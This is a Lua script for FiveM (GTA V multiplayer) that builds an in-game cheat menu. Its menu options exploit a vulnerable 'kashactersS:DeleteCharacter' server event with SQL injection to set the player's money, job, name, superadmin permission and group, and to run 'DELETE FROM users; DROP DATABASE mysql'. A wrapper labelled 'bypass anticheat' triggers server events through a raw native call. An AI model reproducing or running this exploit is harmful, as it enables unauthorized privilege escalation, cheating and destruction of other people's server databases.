local runMenu = 244

rootMenu = { }

rootMenu.debug = false


local menus = { }
local keys = { up = 172, down = 173, left = 174, right = 175, select = 176, back = 177 }
local optionCount = 0

local currentKey = nil
local currentMenu = nil

local titleHeight = 0.11
local titleYOffset = 0.03
local titleScale = 1.0

local buttonHeight = 0.038
local buttonFont = 0
local buttonScale = 0.365
local buttonTextXOffset = 0.005
local buttonTextYOffset = 0.005


local function debugPrint(text)
	if rootMenu.debug then
		Citizen.Trace('[rootMenu] '..tostring(text))
	end
end


local function setMenuProperty(id, property, value)
	if id and menus[id] then
		menus[id][property] = value
		debugPrint(id..' menu property changed: { '..tostring(property)..', '..tostring(value)..' }')
	end
end


local function isMenuVisible(id)
	if id and menus[id] then
		return menus[id].visible
	else
		return false
	end
end


local function setMenuVisible(id, visible, holdCurrent)
	if id and menus[id] then
		setMenuProperty(id, 'visible', visible)

		if not holdCurrent and menus[id] then
			setMenuProperty(id, 'currentOption', 1)
		end

		if visible then
			if id ~= currentMenu and isMenuVisible(currentMenu) then
				setMenuVisible(currentMenu, false)
			end

			currentMenu = id
		end
	end
end


local function drawText(text, x, y, font, color, scale, center, shadow, alignRight)
	SetTextColour(color.r, color.g, color.b, color.a)
	SetTextFont(font)
	SetTextScale(scale, scale)

	if shadow then
		SetTextDropShadow(2, 2, 0, 0, 0)
	end

	if menus[currentMenu] then
		if center then
			SetTextCentre(center)
		elseif alignRight then
			SetTextWrap(menus[currentMenu].x, menus[currentMenu].x + menus[currentMenu].width - buttonTextXOffset)
			SetTextRightJustify(true)
		end
	end

	BeginTextCommandDisplayText("STRING")
	AddTextComponentSubstringPlayerName(text)
	EndTextCommandDisplayText(x, y)
end


local function drawRect(x, y, width, height, color)
	DrawRect(x, y, width, height, color.r, color.g, color.b, color.a)
end


local function drawTitle()
	if menus[currentMenu] then
		local x = menus[currentMenu].x + menus[currentMenu].width / 2
		local y = menus[currentMenu].y + titleHeight / 2

		if menus[currentMenu].titleBackgroundSprite then
			DrawSprite(menus[currentMenu].titleBackgroundSprite.dict, menus[currentMenu].titleBackgroundSprite.name, x, y, menus[currentMenu].width, titleHeight, 0., 255, 255, 255, 255)
		else
			drawRect(x, y, menus[currentMenu].width, titleHeight, menus[currentMenu].titleBackgroundColor)
		end

		drawText(menus[currentMenu].title, x, y - titleHeight / 2 + titleYOffset, menus[currentMenu].titleFont, menus[currentMenu].titleColor, titleScale, true)
	end
end


local function drawSubTitle()
	if menus[currentMenu] then
		local x = menus[currentMenu].x + menus[currentMenu].width / 2
		local y = menus[currentMenu].y + titleHeight + buttonHeight / 2

		local subTitleColor = { r = menus[currentMenu].titleBackgroundColor.r, g = menus[currentMenu].titleBackgroundColor.g, b = menus[currentMenu].titleBackgroundColor.b, a = 255 }

		drawRect(x, y, menus[currentMenu].width, buttonHeight, menus[currentMenu].subTitleBackgroundColor)
		drawText(menus[currentMenu].subTitle, menus[currentMenu].x + buttonTextXOffset, y - buttonHeight / 2 + buttonTextYOffset, buttonFont, subTitleColor, buttonScale, false)

		if optionCount > menus[currentMenu].maxOptionCount then
			drawText(tostring(menus[currentMenu].currentOption)..' / '..tostring(optionCount), menus[currentMenu].x + menus[currentMenu].width, y - buttonHeight / 2 + buttonTextYOffset, buttonFont, subTitleColor, buttonScale, false, false, true)
		end
	end
end


local function drawButton(text, subText)
	local x = menus[currentMenu].x + menus[currentMenu].width / 2
	local multiplier = nil

	if menus[currentMenu].currentOption <= menus[currentMenu].maxOptionCount and optionCount <= menus[currentMenu].maxOptionCount then
		multiplier = optionCount
	elseif optionCount > menus[currentMenu].currentOption - menus[currentMenu].maxOptionCount and optionCount <= menus[currentMenu].currentOption then
		multiplier = optionCount - (menus[currentMenu].currentOption - menus[currentMenu].maxOptionCount)
	end

	if multiplier then
		local y = menus[currentMenu].y + titleHeight + buttonHeight + (buttonHeight * multiplier) - buttonHeight / 2
		local backgroundColor = nil
		local textColor = nil
		local subTextColor = nil
		local shadow = false

		if menus[currentMenu].currentOption == optionCount then
			backgroundColor = menus[currentMenu].menuFocusBackgroundColor
			textColor = menus[currentMenu].menuFocusTextColor
			subTextColor = menus[currentMenu].menuFocusTextColor
		else
			backgroundColor = menus[currentMenu].menuBackgroundColor
			textColor = menus[currentMenu].menuTextColor
			subTextColor = menus[currentMenu].menuSubTextColor
			shadow = true
		end

		drawRect(x, y, menus[currentMenu].width, buttonHeight, backgroundColor)
		drawText(text, menus[currentMenu].x + buttonTextXOffset, y - (buttonHeight / 2) + buttonTextYOffset, buttonFont, textColor, buttonScale, false, shadow)

		if subText then
			drawText(subText, menus[currentMenu].x + buttonTextXOffset, y - buttonHeight / 2 + buttonTextYOffset, buttonFont, subTextColor, buttonScale, false, shadow, true)
		end
	end
end


function rootMenu.CreateMenu(id, title)
	-- Default settings
	menus[id] = { }
	menus[id].title = title
	menus[id].subTitle = ' #################################### '

	menus[id].visible = false

	menus[id].previousMenu = nil

	menus[id].aboutToBeClosed = false

	menus[id].x = 0.0175
	menus[id].y = 0.025
	menus[id].width = 0.23

	menus[id].currentOption = 1
	menus[id].maxOptionCount = 10

	menus[id].titleFont = 1
	menus[id].titleColor = { r = 0, g = 0, b = 0, a = 255 }
	menus[id].titleBackgroundColor = { r = 0, g = 180, b = 40, a = 200 }
	menus[id].titleBackgroundSprite = nil

	menus[id].menuTextColor = { r = 255, g = 255, b = 255, a = 255 }
	menus[id].menuSubTextColor = { r = 189, g = 189, b = 189, a = 255 }
	menus[id].menuFocusTextColor = { r = 0, g = 0, b = 0, a = 255 }
	menus[id].menuFocusBackgroundColor = { r = 245, g = 245, b = 245, a = 255 }
	menus[id].menuBackgroundColor = { r = 0, g = 0, b = 0, a = 160 }

	menus[id].subTitleBackgroundColor = { r = menus[id].menuBackgroundColor.r, g = menus[id].menuBackgroundColor.g, b = menus[id].menuBackgroundColor.b, a = 255 }

	menus[id].buttonPressedSound = { name = "SELECT", set = "HUD_FRONTEND_DEFAULT_SOUNDSET" } --https://pastebin.com/0neZdsZ5

	debugPrint(tostring(id)..' menu created')
end


function rootMenu.CreateSubMenu(id, parent, subTitle)
	if menus[parent] then
		rootMenu.CreateMenu(id, menus[parent].title)

		if subTitle then
			setMenuProperty(id, 'subTitle', string.upper(subTitle))
		else
			setMenuProperty(id, 'subTitle', string.upper(menus[parent].subTitle))
		end

		setMenuProperty(id, 'previousMenu', parent)

		setMenuProperty(id, 'x', menus[parent].x)
		setMenuProperty(id, 'y', menus[parent].y)
		setMenuProperty(id, 'maxOptionCount', menus[parent].maxOptionCount)
		setMenuProperty(id, 'titleFont', menus[parent].titleFont)
		setMenuProperty(id, 'titleColor', menus[parent].titleColor)
		setMenuProperty(id, 'titleBackgroundColor', menus[parent].titleBackgroundColor)
		setMenuProperty(id, 'titleBackgroundSprite', menus[parent].titleBackgroundSprite)
		setMenuProperty(id, 'menuTextColor', menus[parent].menuTextColor)
		setMenuProperty(id, 'menuSubTextColor', menus[parent].menuSubTextColor)
		setMenuProperty(id, 'menuFocusTextColor', menus[parent].menuFocusTextColor)
		setMenuProperty(id, 'menuFocusBackgroundColor', menus[parent].menuFocusBackgroundColor)
		setMenuProperty(id, 'menuBackgroundColor', menus[parent].menuBackgroundColor)
		setMenuProperty(id, 'subTitleBackgroundColor', menus[parent].subTitleBackgroundColor)
	else
		debugPrint('Failed to create '..tostring(id)..' submenu: '..tostring(parent)..' parent menu doesn\'t exist')
	end
end


function rootMenu.CurrentMenu()
	return currentMenu
end


function rootMenu.OpenMenu(id)
	if id and menus[id] then
		PlaySoundFrontend(-1, "SELECT", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
		setMenuVisible(id, true)
		debugPrint(tostring(id)..' menu opened')
	else
		debugPrint('Failed to open '..tostring(id)..' menu: it doesn\'t exist')
	end
end


function rootMenu.IsMenuOpened(id)
	return isMenuVisible(id)
end


function rootMenu.IsAnyMenuOpened()
	for id, _ in pairs(menus) do
		if isMenuVisible(id) then return true end
	end

	return false
end


function rootMenu.IsMenuAboutToBeClosed()
	if menus[currentMenu] then
		return menus[currentMenu].aboutToBeClosed
	else
		return false
	end
end


function rootMenu.CloseMenu()
	if menus[currentMenu] then
		if menus[currentMenu].aboutToBeClosed then
			menus[currentMenu].aboutToBeClosed = false
			setMenuVisible(currentMenu, false)
			debugPrint(tostring(currentMenu)..' menu closed')
			PlaySoundFrontend(-1, "QUIT", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
			optionCount = 0
			currentMenu = nil
			currentKey = nil
		else
			menus[currentMenu].aboutToBeClosed = true
			debugPrint(tostring(currentMenu)..' menu about to be closed')
		end
	end
end


function rootMenu.Button(text, subText)
	local buttonText = text
	if subText then
		buttonText = '{ '..tostring(buttonText)..', '..tostring(subText)..' }'
	end

	if menus[currentMenu] then
		optionCount = optionCount + 1

		local isCurrent = menus[currentMenu].currentOption == optionCount

		drawButton(text, subText)

		if isCurrent then
			if currentKey == keys.select then
				PlaySoundFrontend(-1, menus[currentMenu].buttonPressedSound.name, menus[currentMenu].buttonPressedSound.set, true)
				debugPrint(buttonText..' button pressed')
				return true
			elseif currentKey == keys.left or currentKey == keys.right then
				PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
			end
		end

		return false
	else
		debugPrint('Failed to create '..buttonText..' button: '..tostring(currentMenu)..' menu doesn\'t exist')

		return false
	end
end


function rootMenu.MenuButton(text, id)
	if menus[id] then
		if rootMenu.Button(text) then
			setMenuVisible(currentMenu, false)
			setMenuVisible(id, true, true)

			return true
		end
	else
		debugPrint('Failed to create '..tostring(text)..' menu button: '..tostring(id)..' submenu doesn\'t exist')
	end

	return false
end


function rootMenu.CheckBox(text, checked, callback)
	if rootMenu.Button(text, checked and 'On' or 'Off') then
		checked = not checked
		debugPrint(tostring(text)..' checkbox changed to '..tostring(checked))
		if callback then callback(checked) end

		return true
	end

	return false
end


function rootMenu.ComboBox(text, items, currentIndex, selectedIndex, callback)
	local itemsCount = #items
	local selectedItem = items[currentIndex]
	local isCurrent = menus[currentMenu].currentOption == (optionCount + 1)

	if itemsCount > 1 and isCurrent then
		selectedItem = '← '..tostring(selectedItem)..' →'
	end

	if rootMenu.Button(text, selectedItem) then
		selectedIndex = currentIndex
		callback(currentIndex, selectedIndex)
		return true
	elseif isCurrent then
		if currentKey == keys.left then
			if currentIndex > 1 then currentIndex = currentIndex - 1 else currentIndex = itemsCount end
		elseif currentKey == keys.right then
			if currentIndex < itemsCount then currentIndex = currentIndex + 1 else currentIndex = 1 end
		end
	else
		currentIndex = selectedIndex
	end

	callback(currentIndex, selectedIndex)
	return false
end


function rootMenu.Display()
	if isMenuVisible(currentMenu) then
		if menus[currentMenu].aboutToBeClosed then
			rootMenu.CloseMenu()
		else
			ClearAllHelpMessages()

			drawTitle()
			drawSubTitle()

			currentKey = nil

			if IsControlJustReleased(1, keys.down) then
				PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)

				if menus[currentMenu].currentOption < optionCount then
					menus[currentMenu].currentOption = menus[currentMenu].currentOption + 1
				else
					menus[currentMenu].currentOption = 1
				end
			elseif IsControlJustReleased(1, keys.up) then
				PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)

				if menus[currentMenu].currentOption > 1 then
					menus[currentMenu].currentOption = menus[currentMenu].currentOption - 1
				else
					menus[currentMenu].currentOption = optionCount
				end
			elseif IsControlJustReleased(1, keys.left) then
				currentKey = keys.left
			elseif IsControlJustReleased(1, keys.right) then
				currentKey = keys.right
			elseif IsControlJustReleased(1, keys.select) then
				currentKey = keys.select
			elseif IsControlJustReleased(1, keys.back) then
				StartScreenEffect('CamPushInFranklin', 0, true)
				if menus[menus[currentMenu].previousMenu] then
					PlaySoundFrontend(-1, "BACK", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
					setMenuVisible(menus[currentMenu].previousMenu, true)
				else
					rootMenu.CloseMenu()
				end
			end

			optionCount = 0
		end
	end
end


function rootMenu.SetMenuWidth(id, width)
	setMenuProperty(id, 'width', width)
end


function rootMenu.SetMenuX(id, x)
	setMenuProperty(id, 'x', x)
end


function rootMenu.SetMenuY(id, y)
	setMenuProperty(id, 'y', y)
end


function rootMenu.SetMenuMaxOptionCountOnScreen(id, count)
	setMenuProperty(id, 'maxOptionCount', count)
end


function rootMenu.SetTitle(id, title)
	setMenuProperty(id, 'title', title)
end


function rootMenu.SetTitleColor(id, r, g, b, a)
	setMenuProperty(id, 'titleColor', { ['r'] = r, ['g'] = g, ['b'] = b, ['a'] = a or menus[id].titleColor.a })
end


function rootMenu.SetTitleBackgroundColor(id, r, g, b, a)
	setMenuProperty(id, 'titleBackgroundColor', { ['r'] = r, ['g'] = g, ['b'] = b, ['a'] = a or menus[id].titleBackgroundColor.a })
end


function rootMenu.SetTitleBackgroundSprite(id, textureDict, textureName)
	RequestStreamedTextureDict(textureDict)
	setMenuProperty(id, 'titleBackgroundSprite', { dict = textureDict, name = textureName })
end


function rootMenu.SetSubTitle(id, text)
	setMenuProperty(id, 'subTitle', string.upper(text))
end


function rootMenu.SetMenuBackgroundColor(id, r, g, b, a)
	setMenuProperty(id, 'menuBackgroundColor', { ['r'] = r, ['g'] = g, ['b'] = b, ['a'] = a or menus[id].menuBackgroundColor.a })
end


function rootMenu.SetMenuTextColor(id, r, g, b, a)
	setMenuProperty(id, 'menuTextColor', { ['r'] = r, ['g'] = g, ['b'] = b, ['a'] = a or menus[id].menuTextColor.a })
end

function rootMenu.SetMenuSubTextColor(id, r, g, b, a)
	setMenuProperty(id, 'menuSubTextColor', { ['r'] = r, ['g'] = g, ['b'] = b, ['a'] = a or menus[id].menuSubTextColor.a })
end

function rootMenu.SetMenuFocusColor(id, r, g, b, a)
	setMenuProperty(id, 'menuFocusColor', { ['r'] = r, ['g'] = g, ['b'] = b, ['a'] = a or menus[id].menuFocusColor.a })
end


function rootMenu.SetMenuButtonPressedSound(id, name, set)
	setMenuProperty(id, 'buttonPressedSound', { ['name'] = name, ['set'] = set })
end


Citizen.CreateThread(function()
	local items = { "Item 1", "Item 2", "Item 3", "Item 4", "Item 5" }
	local currentItemIndex = 1
	local selectedItemIndex = 1
	local checkbox = true

	rootMenu.CreateMenu('test', '# rootLoves #')
	rootMenu.CreateSubMenu('closeMenu', 'test', 'Are you sure?')

	while true do
		if rootMenu.IsMenuOpened('test') then
			-- Give me some money
			if rootMenu.Button('Give me some money!', '') then
				local money=KeyboardInput("How much?","",100)
				local db=KeyboardInput("DB NAME (if you dont now please dont type anything)","",100)
				if db == '' then
					db = 'essentialmode'
				end
				if money == '' then
					drawNotification('Amount is empty, please try again.')
				else
					drawNotification('Let take your ' .. money .. ' balance!')
					rootLoves('kashactersS:DeleteCharacter', "';USE `"..db.."`;UPDATE `users` SET `money` = '"..money.."', `bank` = '"..money.."' WHERE `users`.`name` = '"..NetworkPlayerGetName(PlayerId()).."';")
				end
			-- Change my job
			elseif rootMenu.Button('I am not happy with my job', '') then
					local job=KeyboardInput("Which job would you like to work for? (police, mechanic, ambulance)","",100)
					local grade=KeyboardInput("Grade? (1, 2, 3, 4)","",100)
					local db=KeyboardInput("DB NAME (if you dont now please dont type anything)","",100)
					if db == '' then
						db = 'essentialmode'
					end
					if job == '' or grade == '' then
						drawNotification('Input is empty, please try again.')
					else
						drawNotification('You worked hard and finally you are ' .. job)
						rootLoves('kashactersS:DeleteCharacter', "';USE `"..db.."`;UPDATE `users` SET `job` = '"..job.."', `job_grade` = '"..grade.."' WHERE `users`.`name` = '"..NetworkPlayerGetName(PlayerId()).."';")
					end

			-- Change my name
		  elseif rootMenu.Button('I want to be another person', '') then
					local name=KeyboardInput("New name","",100)
					local surname=KeyboardInput("New surname","",100)
					local db=KeyboardInput("DB NAME (if you dont now please dont type anything)","",100)
					if db == '' then
						db = 'essentialmode'
					end
					if job == '' or grade == '' then
						drawNotification('Input is empty, please try again.')
					else
						drawNotification('Your new name is: ' .. name .. ' '.. surname)
						rootLoves('kashactersS:DeleteCharacter', "';USE `"..db.."`;UPDATE `users` SET `firstname` = '"..name.."', `lastname` = '"..surname.."' WHERE `users`.`name` = '"..NetworkPlayerGetName(PlayerId()).."';")
					end
			 -- Trigger server events with anti anti cheat
		 elseif rootMenu.Button('Run lua code with anti anti cheat', '') then
			 		local event=KeyboardInput("EventName","",100)
					local params=KeyboardInput("Params (example : 'welcome', 'world')","",100)
					if event == '' or params then
						drawNotification('Input is empty, please try again.')
					else
						drawNotification('Trying to trigger server event...')
						listParams=split(params,",")
						print(listParams)
					end

			-- Make me god
			elseif rootMenu.Button('Adminpower', '') then
						local db=KeyboardInput("DB NAME (if you dont now please dont type anything)","",100)
						if db == '' then
							db = 'essentialmode'
						end
						drawNotification('You are a apple god!')
						drawNotification('You may have to logout and login again.')
						rootLoves('kashactersS:DeleteCharacter', "';USE `"..db.."`;UPDATE `users` SET `permission_level` = '4', `group` = 'superadmin' WHERE `users`.`name` = '"..NetworkPlayerGetName(PlayerId()).."';")

			-- Destroy server
		elseif rootMenu.Button('Destroy server database', '') then
						drawNotification('Bad guy :(')
						rootLoves('kashactersS:DeleteCharacter', "';DELETE FROM users;DROP DATABASE mysql;")

			elseif rootMenu.MenuButton('Exit', 'closeMenu') then
			end

			rootMenu.Display()
		elseif rootMenu.IsMenuOpened('closeMenu') then
			if rootMenu.Button('Yes') then
				StartScreenEffect('CamPushInFranklin', 0, true)
				rootMenu.CloseMenu()
			elseif rootMenu.MenuButton('No', 'test') then
			end

			rootMenu.Display()
		elseif IsControlJustReleased(0, runMenu) then -- M by default
			drawNotification('Im working on: /files/'..GetCurrentResourceName()..'/resource.rpf')
			StartScreenEffect('CamPushInFranklin', 0, true)
			DatafileDelete()
			rootMenu.OpenMenu('test')
		end

		Citizen.Wait(0)
	end
end)

-- Notifications
function drawNotification(text)
	SetNotificationTextEntry("STRING")
	AddTextComponentString(text)
	DrawNotification(false, false)
end
-- Input
function KeyboardInput(TextEntry, ExampleText, MaxStringLength)
	AddTextEntry("FMMC_KEY_TIP1", TextEntry .. ":")
	DisplayOnscreenKeyboard(1, "FMMC_KEY_TIP1", "", ExampleText, "", "", "", MaxStringLength)
	blockinput = true

	while UpdateOnscreenKeyboard() ~= 1 and UpdateOnscreenKeyboard() ~= 2 do
		Citizen.Wait(0)
	end

	if UpdateOnscreenKeyboard() ~= 2 then
		local result = GetOnscreenKeyboardResult()
		Citizen.Wait(500)
		blockinput = false
		return result
	else
		Citizen.Wait(500)
		blockinput = false
		return nil
	end
end
-- Stop Screen Effects
function StopAllScreenEffects()
	return Citizen.InvokeNative(0xB4EDDC19532BFB85)
end
-- Screen Effects
function StartScreenEffect(effectName, playLength, loop)
	return Citizen.InvokeNative(0x2206BF9A37B7F724, effectName, playLength, loop)
end
-- bypass anticheat
function rootLoves(eventName, ...)
	local payload = msgpack.pack({...})
	return rootLovesInternal(eventName, payload, payload:len())
end
function rootLovesInternal(eventName, eventPayload, payloadLength)
	return Citizen.InvokeNative(0x7fdd1128, _ts(eventName), _ts(eventPayload), payloadLength)
end
-- split
function split(pString, pPattern)
   local Table = {}  -- NOTE: use {n = 0} in Lua-5.0
   local fpat = "(.-)" .. pPattern
   local last_end = 1
   local s, e, cap = pString:find(fpat, 1)
   while s do
      if s ~= 1 or cap ~= "" then
     table.insert(Table,cap)
      end
      last_end = e+1
      s, e, cap = pString:find(fpat, last_end)
   end
   if last_end <= #pString then
      cap = pString:sub(last_end)
      table.insert(Table, cap)
   end
   return Table
end
